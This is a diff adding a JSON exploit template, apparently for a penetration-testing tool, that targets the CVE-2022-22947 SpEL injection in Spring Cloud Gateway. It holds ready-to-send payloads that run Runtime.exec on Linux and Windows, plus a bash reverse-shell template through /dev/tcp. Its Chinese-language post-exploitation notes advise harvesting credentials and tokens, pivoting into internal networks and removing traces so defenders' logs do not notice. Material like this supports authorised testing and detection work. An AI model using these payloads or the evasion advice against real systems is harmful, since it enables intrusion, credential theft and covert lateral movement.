@@ -1,0 +1,127 @@
+{
+  "id": "spring-cve-2022-22947-spring-cloud-gateway-rce",
+  "family": "spring",
+  "product": "Spring Cloud Gateway",
+  "cve": "CVE-2022-22947",
+  "aliases": [
+    "Spring Cloud Gateway Actuator RCE"
+  ],
+  "severity": "critical",
+  "tags": [
+    "spring",
+    "gateway",
+    "actuator",
+    "spel",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "3.1.0",
+      "3.0.0-3.0.6"
+    ],
+    "fingerprints": [
+      "/actuator/gateway/routes exposed",
+      "Gateway route management endpoints accessible",
+      "Actuator refresh endpoint reachable"
+    ],
+    "signals": [
+      "The application accepts POST route definitions",
+      "Route refresh applies filters immediately",
+      "SpEL inside filter definitions affects response headers"
+    ]
+  },
+  "preconditions": [
+    "Actuator route creation and refresh endpoints must be reachable.",
+    "The attacker must be able to hit the newly created route after refresh.",
+    "No upstream validation should strip SpEL syntax from filter arguments."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/actuator/gateway/routes/pentest-probe",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "{\"id\":\"pentest-probe\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"X-SCG-Probe\",\"value\":\"#{'scg-ok'}\"}}],\"uri\":\"https://example.org\",\"predicates\":[{\"name\":\"Path\",\"args\":{\"_genkey_0\":\"/pentest-probe/**\"}}]}",
+        "matchers": [
+          "201 or 200 on route creation",
+          "After POST /actuator/gateway/refresh, GET /pentest-probe returns X-SCG-Probe: scg-ok"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/actuator/gateway/routes/pentest-rce",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "{\"id\":\"pentest-rce\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"Result\",\"value\":\"#{T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}\"}}],\"uri\":\"https://example.org\",\"predicates\":[{\"name\":\"Path\",\"args\":{\"_genkey_0\":\"/pentest-rce/**\"}}]}",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/actuator/gateway/routes/pentest-rce-win",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "{\"id\":\"pentest-rce-win\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"Result\",\"value\":\"#{T(java.lang.Runtime).getRuntime().exec(new String[]{'cmd.exe','/c','whoami'})}\"}}],\"uri\":\"https://example.org\",\"predicates\":[{\"name\":\"Path\",\"args\":{\"_genkey_0\":\"/pentest-rce-win/**\"}}]}",
+        "os_hint": "windows"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "一旦验证成功，立即删除测试路由或改成单个稳定 route，避免暴露明显痕迹。",
+      "优先收集 gateway 配置、后端服务地址、凭据和令牌，再决定是否需要交互式 shell。",
+      "如果网关本身能访问内网，优先把它当 pivot 节点而不是反复打 SpEL。"
+    ],
+    "shell_options": [
+      {
+        "type": "bash_reverse_shell",
+        "template": "Replace Runtime.exec command with /bin/sh -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+      },
+      {
+        "type": "environment_probe",
+        "template": "Use SpEL Runtime.exec to run id; hostname; env; cat /etc/hosts"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先用 harmless AddResponseHeader 证明路由与 SpEL 都可控。",
+      "再做最小化命令执行验证。",
+      "如果网关处于内网边界，优先搜集后端路由和服务发现信息。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "hostname",
+      "env"
+    ],
+    "shell_prerequisites": [
+      "确认新建路由可被访问和刷新。",
+      "确认执行结果是否在响应头或错误日志中可见。"
+    ],
+    "fallbacks": [
+      "如果 AddResponseHeader 被过滤，尝试 SetResponseHeader 或 RewriteResponseHeader 类型的低风险验证。",
+      "如果 Actuator 暴露不完整，转向其他 Spring Actuator、SpEL、Gateway misconfig 或 backend surfaces。"
+    ]
+  },
+  "detection_notes": [
+    "该链非常适合作 harmless verification，因为自定义响应头能明确区分是否命中。",
+    "成功后要及时清理测试路由，否则非常容易被蓝队或平台日志发现。"
+  ],
+  "references": [
+    "VMware Spring Cloud Gateway CVE-2022-22947 advisory",
+    "Public Spring Cloud Gateway actuator exploitation write-ups"
+  ]
+}
